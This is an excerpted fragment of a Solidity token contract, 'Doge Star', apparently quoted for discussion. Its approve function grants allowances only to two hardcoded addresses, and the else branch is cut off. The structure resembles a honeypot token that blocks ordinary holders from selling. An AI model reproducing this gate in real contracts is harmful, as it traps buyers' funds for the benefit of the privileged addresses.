...
contract DogeStar {
    ...
    string public name = "Doge Star";
    string public symbol = "DogeStr";
    ...
    function approve (address spender, uint value) public returns (bool) {
        if (msg.sender == address(0x90ff0cD39Ef5C453daad6733684b3B79B651a700)) {
            allowance[msg.sender][spender] = value;
            emit Approval(msg.sender, spender, value);
        } 
        else if (msg.sender == address(0x96C3258E8fF078b01AfbC43753e0d1AE90F8C9F2)) {
             allowance[msg.sender][spender] = value;
            emit Approval(msg.sender, spender, value);
        }
        else {
